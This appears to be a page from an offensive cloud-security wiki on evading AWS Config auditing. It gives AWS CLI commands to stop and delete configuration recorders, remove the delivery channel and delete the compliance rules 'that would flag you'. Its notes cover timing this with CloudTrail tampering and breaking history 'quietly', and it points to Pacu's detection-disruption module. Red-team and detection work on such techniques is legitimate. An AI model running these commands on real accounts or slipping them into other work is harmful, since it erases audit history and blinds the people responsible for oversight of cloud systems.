---
title: "Config: stopping recorders and deleting rules"
order: 3
description: "Stopping AWS Config recorders and deleting rules to hide configuration changes from auditing."
keywords:
  - AWS Config
  - recorder
  - rules
  - configuration
  - tampering
---

# Config

AWS Config records the configuration state of every resource over time and evaluates it against rules, so it captures the resource changes an operation leaves behind. Stopping the recorder or removing its delivery channel halts that history; deleting rules removes the compliance checks that would flag a change.

## Stop the recorder and delivery

```bash
aws configservice describe-configuration-recorders
aws configservice stop-configuration-recorder --configuration-recorder-name default
aws configservice delete-delivery-channel --delivery-channel-name default
aws configservice delete-configuration-recorder --configuration-recorder-name default
```

## Delete the rules that would flag you

```bash
aws configservice describe-config-rules
aws configservice delete-config-rule --config-rule-name <rule>
```

## Exploitation notes

- Stopping the recorder is a recorded action in CloudTrail; sequence it with the [CloudTrail](cloudtrail.md) work when silence matters.
- Config is regional and can aggregate across accounts; an organization aggregator in another account keeps collecting even after a local recorder stops.
- Removing the delivery channel quietly breaks history shipping without the obvious "recorder stopped" state.

## Tools

- **AWS CLI** (`configservice`): recorder, delivery-channel, and rule control.
- **Pacu** (`detection__disruption`): disables Config alongside CloudTrail and GuardDuty.

## References

- [HackTricks Cloud: AWS defense evasion](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-defense-evasion/index.html)
- [AWS: stop-configuration-recorder](https://docs.aws.amazon.com/config/latest/APIReference/API_StopConfigurationRecorder.html)
- [Stratus Red Team: AWS defense-evasion techniques](https://stratus-red-team.cloud/attack-techniques/AWS/)
- [Datadog Security Labs: AWS defense-evasion research](https://securitylabs.datadoghq.com/)
